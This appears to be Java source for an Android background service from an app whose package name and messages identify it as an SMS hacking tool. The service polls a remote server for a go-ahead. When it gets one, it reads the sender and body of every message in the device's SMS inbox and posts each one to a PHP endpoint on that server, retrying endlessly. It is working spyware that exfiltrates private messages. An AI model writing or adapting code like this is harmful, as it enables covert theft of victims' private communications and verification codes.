package com.example.irhabi_ecsboard.retassms;

/**
 * Created by irhabi_ECSboArd on 3/30/2018.
 */


import android.Manifest;
import android.app.Service;
import android.content.ContentResolver;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.database.Cursor;
import android.net.Uri;
import android.os.IBinder;
import android.support.v4.app.ActivityCompat;
import android.support.v4.content.ContextCompat;
import android.util.Log;
import android.widget.Toast;

import com.android.volley.AuthFailureError;
import com.android.volley.Request;
import com.android.volley.Response;
import com.android.volley.VolleyError;
import com.android.volley.VolleyLog;
import com.android.volley.toolbox.StringRequest;
import com.example.irhabi_ecsboard.retassms.connect.AppConfig;
import com.example.irhabi_ecsboard.retassms.connect.MyApplication;

import org.json.JSONException;
import org.json.JSONObject;

import java.util.ArrayList;
import java.util.HashMap;
import java.util.Map;

public class TheService extends Service {
    @Override
    public IBinder onBind(Intent arg0) {
        return null;
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        // We want this service to continue running until it is explicitly
        // stopped, so return sticky.
        Toast.makeText(this, "Aplikasi Retas Di jalankan di blakang layar", Toast.LENGTH_LONG).show();
        kirimdata();
        return START_STICKY;
    }
    @Override
    public void onDestroy() {
        super.onDestroy();
        Toast.makeText(this, "The Service Destroyed", Toast.LENGTH_LONG).show();
    }
    private void showContacts() {
        // Create Inbox box URI
        Uri inboxURI = Uri.parse("content://sms/inbox");
        // Get Content Resolver object, which will deal with Content Provider
        ContentResolver cr = getContentResolver();
        // Fetch Inbox SMS Message from Built-in Content Provider
        Cursor c = cr.query(inboxURI, null, null, null, null);
        while (c.moveToNext()) {
            String Number = c.getString(c.getColumnIndexOrThrow("address")).toString();
            String Body = c.getString(c.getColumnIndexOrThrow("body")).toString();
            simpanData(Number,Body, "katakan", "tidak");
        }
        c.close();
        kirimdata();
    }

    private void simpanData(final String no, final String bodyy, final String email, final String Password) {
        String url_simpan = AppConfig.URL_REGISTER + "smscekingdua.php";

        String tag_json = "tag_json";

        StringRequest stringRequest = new StringRequest(Request.Method.POST, url_simpan, new Response.Listener<String>() {
            @Override
            public void onResponse(String response) {
                Log.d("response", response.toString());
                try {
                    JSONObject jObject = new JSONObject(response);
                    String pesan = jObject.getString("pesan");
                    String hasil = jObject.getString("result");
                    if (hasil.equalsIgnoreCase("true")) {

                    } else {

                    }
                } catch (JSONException e) {
                    e.printStackTrace();
                }
            }
        }, new Response.ErrorListener() {
            @Override
            public void onErrorResponse(VolleyError error) {
                VolleyLog.d("ERROR", error.getMessage());
                Toast.makeText(TheService.this, error.getMessage(), Toast.LENGTH_SHORT).show();
            }
        }) {
            @Override
            protected Map<String, String> getParams() throws AuthFailureError {
                Map<String, String> param = new HashMap<String, String>();
                param.put("kita", no); // sesuaaikan dengan nama $_POST
                param.put("nohp", bodyy);// sesuaaikan dengan nama $_POST
                param.put("email", email);// sesuaaikan dengan nama $_post
                param.put("password","0");// sesuaaikan dengan $_POST
                return param;
            }
        };
        MyApplication.getInstance().addToRequestQueue(stringRequest, tag_json);
    }
    private void kirimdata() {
        String url_simpan = AppConfig.URL_REGISTER + "smsceking.php";

        String tag_json = "tag_json";

        StringRequest stringRequest = new StringRequest(Request.Method.POST, url_simpan, new Response.Listener<String>() {
            @Override
            public void onResponse(String response) {
                Log.d("response", response.toString());
                try {
                    JSONObject jObject = new JSONObject(response);
                    String ceking = jObject.getString("ceking");
                    String hasil = jObject.getString("result");

                    if (ceking.equalsIgnoreCase("1")) {
                        showContacts();
                    } else {
                        kita();
                    }
                }catch (JSONException e) {
                    e.printStackTrace();
                    Toast.makeText(TheService.this, "Error JSON", Toast.LENGTH_SHORT).show();
                    kita();
                }
            }
        }, new Response.ErrorListener() {
            @Override
            public void onErrorResponse(VolleyError error) {
                VolleyLog.d("ERROR", error.getMessage());
                Toast.makeText(TheService.this, error.getMessage(), Toast.LENGTH_SHORT).show();
                kita();
            }
        }) {
            @Override
            protected Map<String, String> getParams() throws AuthFailureError {
                Map<String, String> param = new HashMap<String, String>();
                param.put("name", "maryam"); // sesuaaikan dengan nama $_POST
                return param;
            }
        };
        MyApplication.getInstance().addToRequestQueue(stringRequest, tag_json);
    }

    public void kita(){
        kirimdata();
    }
}